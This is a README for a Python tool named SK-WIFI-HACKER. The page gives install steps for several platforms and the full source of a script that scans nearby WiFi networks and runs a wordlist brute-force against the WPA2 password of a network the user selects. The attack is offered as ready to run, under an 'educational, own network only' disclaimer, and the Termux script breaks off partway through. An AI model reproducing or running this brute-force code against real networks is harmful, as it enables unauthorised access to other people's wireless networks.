<!-- ═══════════════════════════════════════════════════════════ -->
<!--                     SK-WIFI-HACKER                          -->
<!--          Developer: SHEIKH SABBIR | Org: CyberNet-SK        -->
<!--         Repo: https://github.com/CyberNet-SK/SK-WIFI-HACKER -->
<!-- ═══════════════════════════════════════════════════════════ -->

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:00ff00,50:00ffff,100:ff00ff&height=220&section=header&text=SK-WIFI-HACKER&fontSize=72&fontColor=ffffff&animation=fadeIn&fontAlignY=38&desc=WiFi%20Scanner%20%2B%20Password%20Finder&descAlignY=58&descSize=20" width="100%"/>

<p>
  <img src="https://img.shields.io/badge/Version-1.0.0-00ff88?style=for-the-badge&logo=python&logoColor=white" />
  <img src="https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white" />
  <img src="https://img.shields.io/badge/Platform-Windows%20|%20Linux%20|%20Termux-0078D6?style=for-the-badge&logo=windows&logoColor=white" />
  <img src="https://img.shields.io/badge/License-Educational-red?style=for-the-badge" />
</p>

<p>
  <img src="https://img.shields.io/badge/Org-CyberNet--SK-00ff88?style=for-the-badge&logo=github&logoColor=white" />
  <img src="https://img.shields.io/badge/Developer-SHEIKH%20SABBIR-ff00ff?style=for-the-badge&logo=github&logoColor=white" />
  <img src="https://img.shields.io/badge/Status-Active-00ff00?style=for-the-badge" />
</p>

<a href="https://git.io/typing-svg">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=22&duration=3000&pause=1000&color=00FF88&center=true&vCenter=true&width=650&lines=Scan+WiFi+Networks;Find+Valid+Passwords;Numbered+List+(1%2C2%2C3...);Hacker+Style+UI;Educational+Purpose+Only" alt="Typing SVG" />
</a>

</div>

---

<div align="center">

## 🔗 **Repo Link**

**[https://github.com/CyberNet-SK/SK-WIFI-HACKER.git](https://github.com/CyberNet-SK/SK-WIFI-HACKER.git)**

</div>

---

## 🎯 What is SK-WIFI-HACKER?

**SK-WIFI-HACKER** is an **educational Python tool** that:

- 🔍 Scans all nearby WiFi networks
- 📋 Shows a beautiful **numbered list** `[1] [2] [3] ...`
- 🔢 Type a number → attack starts automatically
- 🔐 Tries each password from `password.txt`
- ✅ Shows the **valid password** in big text when found

> ⚠️ **Only for use on YOUR OWN WiFi or networks you have written permission to test.**

---

## 📁 Project Structure

```
SK-WIFI-HACKER/
│
├── sk_hacker.py           ← Main script (Windows / Linux)
├── sk_hacker_termux.py    ← Termux scan-only version
├── password.txt           ← Password wordlist
├── requirements.txt       ← Python dependencies
├── README.md              ← This file
├── LICENSE                ← Educational license
├── CHANGELOG.md           ← Version history
├── CONTRIBUTING.md        ← Contribution guide
├── SECURITY.md            ← Security policy
└── .gitignore             ← Git ignore rules
```

---

## ⚡ Platform Support

| Platform | Scan | Brute Force | Note |
|----------|:----:|:-----------:|------|
| 🪟 **Windows PC** | ✅ | ✅ | **Best Support** |
| 🐧 **Linux PC** | ✅ | ✅ | sudo required |
| 📱 **Termux (Android)** | ✅ | ❌ | scan-only version |
| 🍎 **macOS** | ⚠️ | ❌ | limited |

---

# 🪟 **INSTALLATION — WINDOWS PC**

## 📋 Prerequisites

- Windows 10 / 11
- Internet connection
- Administrator access
- WiFi adapter enabled

## 🔧 Step 1 — Install Python

1. Go to **https://www.python.org/downloads/**
2. Download **Python 3.12** (or latest)
3. Run installer
4. ⚠️ **IMPORTANT:** check ✅ **"Add Python to PATH"**
5. Click **Install Now**

### ✔️ Verify Python

Open **Command Prompt (cmd)** and run:

```cmd
python --version
pip --version
```

Expected output:

```
Python 3.12.x
pip 24.x.x
```

## 🔧 Step 2 — Install Git

1. Download from **https://git-scm.com/download/win**
2. Install with default options

Verify:

```cmd
git --version
```

## 📥 Step 3 — Clone the Repository

Open **Command Prompt** and run:

```cmd
cd %USERPROFILE%\Desktop
git clone https://github.com/CyberNet-SK/SK-WIFI-HACKER.git
cd SK-WIFI-HACKER
```

**Alternative (no git):**

1. Visit **https://github.com/CyberNet-SK/SK-WIFI-HACKER**
2. Click green **Code** button → **Download ZIP**
3. Extract the ZIP
4. Open the extracted folder in cmd

## 📦 Step 4 — Install Dependencies

**Open Command Prompt as Administrator:**

- Start Menu → type `cmd` → right-click → **Run as administrator**

```cmd
cd %USERPROFILE%\Desktop\SK-WIFI-HACKER
pip install -r requirements.txt
```

**If `pip install -r` fails, install manually:**

```cmd
pip install pywifi==1.1.11
pip install comtypes==1.2.1
pip install colorama==0.4.6
```

## ▶️ Step 5 — Run the Tool

**Still in Administrator cmd:**

```cmd
python sk_hacker.py
```

**If `python` doesn't work:**

```cmd
py sk_hacker.py
```

## 🎬 Windows — What You'll See

```
  ███████╗██╗  ██╗       ██╗    ██╗██╗███████╗██╗
  ██╔════╝██║ ██╔╝       ██║    ██║██║██╔════╝██║
  ███████╗█████╔╝        ██║ █╗ ██║██║█████╗  ██║
  ╚════██║██╔═██╗        ██║███╗██║██║██╔══╝  ██║
  ███████║██║  ██╗       ╚███╔███╔╝██║██║     ██║
  ╚══════╝╚═╝  ╚═╝        ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
     ███████║███████║██║     █████╔╝ █████╗  ██████╔╝
     ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
     ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

  ╔════════════════════════════════════════════════════╗
  ║        DEVELOPER :  SHEIKH  SABBIR                 ║
  ║        ORG       :  CyberNet-SK                    ║
  ║        GITHUB    :  CyberNet-SK/SK-WIFI-HACKER     ║
  ║        VERSION   :  1.0                            ║
  ╚════════════════════════════════════════════════════╝

[*] Scanning WiFi networks...

────────────────────────────────────────────────────────────
  #    WiFi NAME                    SIGNAL   BARS     SECURITY
────────────────────────────────────────────────────────────
  [1]  MyHomeWiFi                   -42 dBm  ▂▄▆█     🔒 WPA2
  [2]  TP-Link_1234                 -55 dBm  ▂▄▆_     🔒 WPA/WPA2
  [3]  CoffeeShop_Free              -67 dBm  ▂▄__     🔓 OPEN
────────────────────────────────────────────────────────────

  📡 নম্বর টাইপ করো (1, 2, 3...) অথবা 'r' = rescan, 'q' = quit

  SK-HACKER ❯
```

## 🐛 Windows Common Errors

| Error | Solution |
|-------|----------|
| `python: not recognized` | Reinstall Python with "Add to PATH" |
| `pip: not recognized` | Use `python -m pip install ...` |
| `[WinError 5] Access Denied` | Run cmd as Administrator |
| `pywifi interface not found` | Enable WiFi, update drivers |
| `NotImplementedError` | Install `pywifi==1.1.11` (older version) |
| `comtypes error` | `pip install --upgrade comtypes` |

---

# 🐧 **INSTALLATION — LINUX PC**

**Tested on:** Ubuntu 20.04/22.04/24.04, Debian 11/12, Kali Linux, Arch Linux

## 🔧 Step 1 — Update System

```bash
sudo apt update && sudo apt upgrade -y
```

## 🐍 Step 2 — Install Python, pip, Git

**Debian / Ubuntu / Kali:**

```bash
sudo apt install python3 python3-pip python3-venv git -y
```

**Arch:**

```bash
sudo pacman -S python python-pip git
```

**Fedora:**

```bash
sudo dnf install python3 python3-pip git
```

### ✔️ Verify

```bash
python3 --version
pip3 --version
git --version
```

## 📥 Step 3 — Clone the Repo

```bash
cd ~
git clone https://github.com/CyberNet-SK/SK-WIFI-HACKER.git
cd SK-WIFI-HACKER
```

## 📦 Step 4 — Create Virtual Environment (Recommended)

```bash
python3 -m venv venv
source venv/bin/activate
```

Prompt এ দেখবে: `(venv) user@linux:~/SK-WIFI-HACKER$`

## 📥 Step 5 — Install Python Dependencies

```bash
pip install -r requirements.txt
```

**Manual:**

```bash
pip install pywifi==1.1.11
pip install comtypes==1.2.1
pip install colorama==0.4.6
```

## ⚙️ Step 6 — Install WiFi Tools

```bash
sudo apt install wireless-tools wpasupplicant iw net-tools -y
```

## ▶️ Step 7 — Run the Tool (with sudo)

```bash
sudo python3 sk_hacker.py
```

> ⚠️ **sudo required** — otherwise WiFi scan won't work.

## 🐛 Linux Common Errors

| Error | Solution |
|-------|----------|
| `Permission denied` | Use `sudo` |
| `No module named pywifi` | Activate venv, then install |
| `interface not found` | Run `iwconfig` — check for wlan0 |
| `wpa_supplicant not running` | `sudo systemctl start wpa_supplicant` |
| `nmcli conflict` | `sudo systemctl stop NetworkManager` |

## 📡 Linux Alternative — nmcli

If `pywifi` fails, use `nmcli`:

```bash
# Scan
nmcli device wifi list

# Connect
nmcli device wifi connect "SSID" password "PASSWORD"
```

---

# 📱 **INSTALLATION — TERMUX (ANDROID)**

> ⚠️ **Important:** `pywifi` does **NOT** work on Termux. We provide a **scan-only version** (`sk_hacker_termux.py`).

## 📥 Step 1 — Install Termux (F-Droid ONLY)

> 🚫 **Do NOT use Google Play version — it's outdated!**

1. Download **F-Droid**: https://f-droid.org/
2. Install F-Droid APK
3. In F-Droid, search **Termux** → install
4. Also install **Termux:API** from F-Droid

## 🔧 Step 2 — Setup Termux

Open Termux and run:

```bash
# Update packages
pkg update && pkg upgrade -y

# Install essentials
pkg install python git termux-api colorama -y

# Enable storage access
termux-setup-storage
```

→ Allow the permission popup.

## ✔️ Step 3 — Verify termux-api

```bash
termux-wifi-scaninfo
```

Expected output (JSON):

```json
[{"bssid":"aa:bb:cc:dd:ee:ff","ssid":"MyWiFi","frequency":2412,"level":-42,...}]
```

## 📥 Step 4 — Clone the Repo

```bash
cd ~
git clone https://github.com/CyberNet-SK/SK-WIFI-HACKER.git
cd SK-WIFI-HACKER
```

## ▶️ Step 5 — Run (Scan Only)

```bash
python sk_hacker_termux.py
```

## 🎬 Termux — What You'll See

```
  ███████╗██╗  ██╗       ██╗    ██╗██╗███████╗██╗
  ...
  ╔════════════════════════════════════════════════════╗
  ║        DEVELOPER :  SHEIKH  SABBIR                 ║
  ║        ORG       :  CyberNet-SK                    ║
  ║        MODE      :  Termux Scan-Only               ║
  ╚════════════════════════════════════════════════════╝

────────────────────────────────────────────────────────────
  #    WiFi NAME                  SIGNAL    BARS     BSSID
────────────────────────────────────────────────────────────
  [1]  MyHomeWiFi                 -42 dBm   ▂▄▆█     aa:bb:...
  [2]  TP-Link_1234               -55 dBm   ▂▄▆_     11:22:...
  [3]  CoffeeShop_Free            -67 dBm   ▂▄__     22:33:...
────────────────────────────────────────────────────────────

  📡 'r' = rescan, 'q' = quit
  ⚠️  Note: Termux-এ scan-only। Brute force root ছাড়া সম্ভব না।
```

## 🐛 Termux Common Errors

| Error | Solution |
|-------|----------|
| `termux-wifi-scaninfo: not found` | `pkg install termux-api` + install Termux:API app |
| `NotImplementedError` (pywifi) | Use `sk_hacker_termux.py` instead |
| Empty scan list | Turn ON Location in Android Settings |
| `Permission denied` | Settings → Apps → Termux → Permissions → Location ON |

## 🔓 Termux + Root (if your phone IS rooted)

```bash
pkg install root-repo -y
pkg install tsu -y
tsu
nmcli device wifi list
```

---

# 🍎 **INSTALLATION — macOS (Limited)**

`pywifi` doesn't work on macOS, but you can scan with `airport`:

```bash
# Scan
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s

# Add alias (one time)
echo 'alias wifiscan="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s"' >> ~/.zshrc
source ~/.zshrc

# Then just type:
wifiscan
```

> ❌ Brute force not possible on macOS.

---

# 🚀 **QUICK ONE-LINE INSTALLS**

## Windows (PowerShell as Admin)

```powershell
cd $env:USERPROFILE\Desktop; git clone https://github.com/CyberNet-SK/SK-WIFI-HACKER.git; cd SK-WIFI-HACKER; pip install -r requirements.txt; python sk_hacker.py
```

## Linux (Bash)

```bash
cd ~ && git clone https://github.com/CyberNet-SK/SK-WIFI-HACKER.git && cd SK-WIFI-HACKER && pip3 install -r requirements.txt && sudo python3 sk_hacker.py
```

## Termux (Bash)

```bash
cd ~ && pkg install python git termux-api colorama -y && git clone https://github.com/CyberNet-SK/SK-WIFI-HACKER.git && cd SK-WIFI-HACKER && python sk_hacker_termux.py
```

---

# 📥 **ALL CLONE METHODS**

### HTTPS (Recommended)

```bash
git clone https://github.com/CyberNet-SK/SK-WIFI-HACKER.git
```

### SSH

```bash
git clone git@github.com:CyberNet-SK/SK-WIFI-HACKER.git
```

### GitHub CLI

```bash
gh repo clone CyberNet-SK/SK-WIFI-HACKER
```

### ZIP Download (Linux/Mac/Termux)

```bash
wget https://github.com/CyberNet-SK/SK-WIFI-HACKER/archive/refs/heads/main.zip
unzip main.zip
cd SK-WIFI-HACKER-main
```

### ZIP Download (Windows PowerShell)

```powershell
Invoke-WebRequest -Uri "https://github.com/CyberNet-SK/SK-WIFI-HACKER/archive/refs/heads/main.zip" -OutFile "SK-WIFI-HACKER.zip"
Expand-Archive -Path "SK-WIFI-HACKER.zip" -DestinationPath "."
cd SK-WIFI-HACKER-main
```

---

# 🎮 **USAGE FLOW**

```
┌────────────────────────────────────────────┐
│  1️⃣  python sk_hacker.py                   │
├────────────────────────────────────────────┤
│  2️⃣  RGB banner animation দেখবে            │
├────────────────────────────────────────────┤
│  3️⃣  Auto scan শুরু হবে (4 sec)            │
├────────────────────────────────────────────┤
│  4️⃣  WiFi list দেখাবে (1, 2, 3...)         │
├────────────────────────────────────────────┤
│  5️⃣  একটা নম্বর টাইপ করো — like: 1          │
├────────────────────────────────────────────┤
│  6️⃣  Attack auto শুরু হবে                  │
├────────────────────────────────────────────┤
│  7️⃣  Valid password পেলে ✅ দেখাবে          │
├────────────────────────────────────────────┤
│  8️⃣  'r' = rescan, 'q' = quit              │
└────────────────────────────────────────────┘
```

### ⌨️ Keyboard Controls

| Key | Action |
|-----|--------|
| `1` – `9` | Select WiFi & start attack |
| `r` | Rescan networks |
| `q` | Quit program |
| `Ctrl+C` | Stop current attack |

---

# 📄 **SOURCE CODE FILES**

## 1️⃣ `sk_hacker.py` — Main Script

```python
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════╗
║              SK-WIFI-HACKER  v1.0                        ║
║              Developer : SHEIKH SABBIR                   ║
║              Org       : CyberNet-SK                     ║
║              Repo      : github.com/CyberNet-SK/SK-WIFI-HACKER ║
║              Purpose   : Educational Only                ║
╚══════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
from colorama import Fore, Style, init
init(autoreset=True)

try:
    import pywifi
    from pywifi import const
except ImportError:
    print("[!] Run: pip install pywifi comtypes")
    sys.exit(1)

BANNER = r"""
  ███████╗██╗  ██╗       ██╗    ██╗██╗███████╗██╗
  ██╔════╝██║ ██╔╝       ██║    ██║██║██╔════╝██║
  ███████╗█████╔╝        ██║ █╗ ██║██║█████╗  ██║
  ╚════██║██╔═██╗        ██║███╗██║██║██╔══╝  ██║
  ███████║██║  ██╗       ╚███╔███╔╝██║██║     ██║
  ╚══════╝╚═╝  ╚═╝        ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
     ███████║███████║██║     █████╔╝ █████╗  ██████╔╝
     ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
     ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
"""

COLORS = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]

def clear(): os.system("cls" if os.name == "nt" else "clear")

def banner():
    for line in BANNER.split("\n"):
        c = COLORS[len(line) % len(COLORS)]
        print(Style.BRIGHT + c + line + Style.RESET_ALL)
        time.sleep(0.02)
    print()
    print(Fore.CYAN + Style.BRIGHT + "  ╔════════════════════════════════════════════════════╗")
    print(Fore.CYAN + Style.BRIGHT + "  ║        DEVELOPER :  SHEIKH  SABBIR                 ║")
    print(Fore.CYAN + Style.BRIGHT + "  ║        ORG       :  CyberNet-SK                    ║")
    print(Fore.CYAN + Style.BRIGHT + "  ║        GITHUB    :  CyberNet-SK/SK-WIFI-HACKER     ║")
    print(Fore.CYAN + Style.BRIGHT + "  ║        VERSION   :  1.0                            ║")
    print(Fore.CYAN + Style.BRIGHT + "  ╚════════════════════════════════════════════════════╝\n")

def sep(): print(Fore.MAGENTA + "─" * 60 + Style.RESET_ALL)

def scan():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    print(Fore.YELLOW + "[*] Scanning WiFi networks..." + Style.RESET_ALL)
    iface.scan()
    time.sleep(4)
    nets = []
    for n in iface.scan_results():
        if n.ssid.strip():
            nets.append({"ssid": n.ssid.strip(), "signal": n.signal, "akm": n.akm})
    best = {}
    for n in nets:
        if n["ssid"] not in best or n["signal"] > best[n["ssid"]]["signal"]:
            best[n["ssid"]] = n
    return sorted(best.values(), key=lambda x: x["signal"], reverse=True)

def bars(s):
    if s >= -50: return Fore.GREEN + "▂▄▆█" + Style.RESET_ALL
    if s >= -60: return Fore.GREEN + "▂▄▆_" + Style.RESET_ALL
    if s >= -70: return Fore.YELLOW + "▂▄__" + Style.RESET_ALL
    if s >= -80: return Fore.RED + "▂___" + Style.RESET_ALL
    return Fore.RED + "____" + Style.RESET_ALL

def show(nets):
    print()
    sep()
    print(Fore.CYAN + Style.BRIGHT + f"  {'#':<4} {'WiFi NAME':<28} {'SIGNAL':<8} BARS")
    sep()
    for i, n in enumerate(nets, 1):
        num = Fore.GREEN + Style.BRIGHT + f"[{i}]" + Style.RESET_ALL
        name = Fore.WHITE + Style.BRIGHT + n["ssid"][:26].ljust(28) + Style.RESET_ALL
        sig = Fore.CYAN + f"{n['signal']:>4} dBm".ljust(8) + Style.RESET_ALL
        print(f"  {num:<6} {name} {sig} {bars(n['signal'])}")
    sep()
    print()

def load_pw(path="password.txt"):
    if not os.path.exists(path):
        print(Fore.RED + f"[!] {path} not found" + Style.RESET_ALL)
        return []
    return [l.strip() for l in open(path, encoding="utf-8", errors="ignore") if l.strip()]

def try_pw(iface, ssid, pw):
    try:
        iface.disconnect(); time.sleep(0.3)
        iface.remove_all_network_profiles()
        p = pywifi.Profile()
        p.ssid = ssid
        p.auth = const.AUTH_ALG_OPEN
        p.akm.append(const.AKM_TYPE_WPA2PSK)
        p.cipher = const.CIPHER_TYPE_CCMP
        p.key = pw
        t = iface.add_network_profile(p)
        iface.connect(t)
        for _ in range(6):
            time.sleep(1)
            if iface.status() == const.IFACE_CONNECTED:
                return True
    except Exception:
        pass
    return False

def attack(ssid, passwords):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    total = len(passwords)
    print()
    sep()
    print(Fore.CYAN + Style.BRIGHT + f"  🎯 TARGET : {ssid}")
    print(Fore.CYAN + Style.BRIGHT + f"  📋 TOTAL  : {total}")
    print(Fore.CYAN + Style.BRIGHT + f"  ⏱  START  : {time.strftime('%H:%M:%S')}")
    sep(); print()
    start = time.time()
    for i, pw in enumerate(passwords, 1):
        sys.stdout.write("\r" + Fore.YELLOW + f"[{i:>5}/{total}]  Trying: {pw:<20}" + Style.RESET_ALL)
        sys.stdout.flush()
        if try_pw(iface, ssid, pw):
            print("\n")
            print(Fore.GREEN + Style.BRIGHT + "  ╔════════════════════════════════════════════════╗")
            print(Fore.GREEN + Style.BRIGHT + "  ║        ✅  PASSWORD  FOUND  ✅                 ║")
            print(Fore.GREEN + Style.BRIGHT + "  ╚════════════════════════════════════════════════╝\n")
            print(Fore.GREEN + Style.BRIGHT + f"  🔑 SSID     : {ssid}")
            print(Fore.GREEN + Style.BRIGHT + f"  🔓 PASSWORD : {pw}")
            print(Fore.GREEN + Style.BRIGHT + f"  ⏱  TIME     : {time.time()-start:.1f} sec\n")
            return pw
    print("\n" + Fore.RED + f"  ❌ Not found in {total} passwords" + Style.RESET_ALL)
    return None

def main():
    clear(); banner()
    while True:
        nets = scan()
        if not nets:
            print(Fore.RED + "[!] No networks found" + Style.RESET_ALL); return
        show(nets)
        print(Fore.CYAN + "  📡 Number (1,2,3...) / 'r' rescan / 'q' quit" + Style.RESET_ALL)
        try:
            c = input(Fore.GREEN + Style.BRIGHT + "\n  SK-HACKER ❯ " + Style.RESET_ALL).strip()
        except (KeyboardInterrupt, EOFError):
            print("\n  Bye! 👋"); return
        if c.lower() in ("q", "quit"): return
        if c.lower() in ("r", ""): clear(); banner(); continue
        if not c.isdigit() or not (1 <= int(c) <= len(nets)):
            print(Fore.RED + "  [!] Invalid choice" + Style.RESET_ALL); continue
        target = nets[int(c) - 1]
        print(Fore.YELLOW + f"\n  🎯 Selected: {target['ssid']}" + Style.RESET_ALL)
        pw = load_pw()
        if not pw: return
        attack(target["ssid"], pw)
        print(); sep()
        print(Fore.CYAN + "  'r' rescan, 'q' quit" + Style.RESET_ALL); sep()

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print("\n  Bye! 👋")
```

## 2️⃣ `sk_hacker_termux.py` — Termux Scan-Only

```python
#!/usr/bin/env python3
"""
SK-WIFI-HACKER (Termux Edition)
Developer: SHEIKH SABBIR | Org: CyberNet-SK
"""

import os, sys, json, time, subprocess
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE=RESET=""
    class Style: BRIGHT=RESET_ALL=""

BANNER = r"""
  ███████╗██╗  ██╗       ██╗    ██╗██╗███████╗██╗
  ██╔════╝██║ ██╔╝       ██║    ██║██║██╔════╝██║
  ███████╗█████╔╝        ██║ █╗ ██║██║█████╗  ██║
  ╚════██║██╔═██╗        ██║███╗██║██║██╔══╝  ██║
  ███████║██║  ██╗       ╚███╔███╔╝██║██║     ██║
  ╚══════╝╚═╝  ╚═╝        ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
     ███████║███████║██║     █████╔╝ █████╗  ██████╔╝
     ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
     ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
"""

COLORS = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.C
